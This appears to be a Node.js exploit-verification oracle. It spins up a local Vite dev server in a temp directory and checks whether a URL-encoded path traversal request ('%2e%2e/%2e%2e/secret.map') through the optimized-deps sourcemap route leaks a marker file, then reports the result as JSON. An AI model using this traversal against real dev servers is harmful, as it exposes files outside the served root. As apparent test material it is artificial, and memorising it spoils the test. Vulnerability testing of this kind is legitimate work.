const fs = require('node:fs');
const path = require('node:path');
const os = require('node:os');

(async () => {
  let operation_completed = false;
  let exploit_succeeded = false;
  let evidence = '';
  let server;

  function finish() {
    console.log('ORACLE_RESULT ' + JSON.stringify({ operation_completed, exploit_succeeded, evidence: String(evidence) }));
  }

  function callMiddlewares(middlewares, urlPath) {
    return new Promise((resolve, reject) => {
      const req = { method: 'GET', url: urlPath, headers: { host: 'localhost' } };
      const chunks = [];
      let settled = false;

      const res = {
        statusCode: 200,
        headers: {},
        setHeader(k, v) { this.headers[String(k).toLowerCase()] = v; },
        getHeader(k) { return this.headers[String(k).toLowerCase()]; },
        writeHead(code, headers) {
          this.statusCode = code;
          if (headers && typeof headers === 'object') {
            for (const key of Object.keys(headers)) this.setHeader(key, headers[key]);
          }
        },
        write(chunk) {
          if (chunk !== undefined && chunk !== null) chunks.push(Buffer.isBuffer(chunk) ? chunk : Buffer.from(String(chunk)));
        },
        end(chunk) {
          if (settled) return;
          if (chunk !== undefined && chunk !== null) chunks.push(Buffer.isBuffer(chunk) ? chunk : Buffer.from(String(chunk)));
          settled = true;
          resolve({ ended: true, statusCode: this.statusCode || 200, headers: this.headers, body: Buffer.concat(chunks).toString('utf8') });
        }
      };

      const next = (err) => {
        if (settled) return;
        settled = true;
        if (err) return reject(err);
        resolve({ ended: false, statusCode: res.statusCode || 404, headers: res.headers, body: Buffer.concat(chunks).toString('utf8') });
      };

      try {
        middlewares(req, res, next);
      } catch (e) {
        reject(e);
      }
    });
  }

  try {
    const vite = await import('vite');

    const base = fs.mkdtempSync(path.join(os.tmpdir(), 'vite-map-traversal-'));
    const root = path.join(base, 'app');
    const depsDir = path.join(root, 'node_modules', '.vite', 'deps');
    fs.mkdirSync(depsDir, { recursive: true });

    fs.writeFileSync(path.join(root, 'index.html'), '<!doctype html><html><body>ok</body></html>');
    fs.writeFileSync(path.join(depsDir, 'chunk-ok.js'), 'export const ok = 1;');
    fs.writeFileSync(path.join(depsDir, 'chunk-ok.js.map'), JSON.stringify({ version: 3, file: 'chunk-ok.js', sources: ['chunk-ok.ts'], mappings: '' }));

    const marker = 'VITE_MAP_TRAVERSAL_MARKER_' + process.pid + '_' + Date.now();
    const outsideSecret = path.join(root, 'secret.map');
    fs.writeFileSync(outsideSecret, marker);

    server = await vite.createServer({ root, logLevel: 'silent' });

    const benign = await callMiddlewares(server.middlewares, '/node_modules/.vite/deps/chunk-ok.js.map');
    const benignOk = benign && benign.ended && benign.statusCode >= 200 && benign.statusCode < 300 && typeof benign.body === 'string' && benign.body.includes('"version"');
    if (!benignOk) {
      evidence = 'benign operation failed: status=' + (benign && benign.statusCode) + ' ended=' + (benign && benign.ended) + ' body_len=' + (benign && benign.body ? benign.body.length : 0);
      if (server) await server.close();
      return finish();
    }

    operation_completed = true;

    let mal;
    try {
      mal = await callMiddlewares(server.middlewares, '/node_modules/.vite/deps/%2e%2e/%2e%2e/secret.map');
    } catch (e) {
      exploit_succeeded = false;
      evidence = 'malicious request threw after benign success: ' + (e && e.message ? e.message : String(e));
      if (server) await server.close();
      return finish();
    }

    const leaked = !!(mal && typeof mal.body === 'string' && mal.body.includes(marker));
    exploit_succeeded = leaked;
    evidence = leaked
      ? 'marker leaked from ' + outsideSecret + ' via optimized deps .map traversal'
      : 'marker not leaked; status=' + (mal && mal.statusCode) + ' ended=' + (mal && mal.ended) + ' body_len=' + (mal && mal.body ? mal.body.length : 0);

    if (server) await server.close();
    return finish();
  } catch (e) {
    if (server) {
      try { await server.close(); } catch (_) {}
    }
    operation_completed = false;
    exploit_succeeded = false;
    evidence = 'setup/module/benign failure: ' + (e && e.message ? e.message : String(e));
    return finish();
  }
})();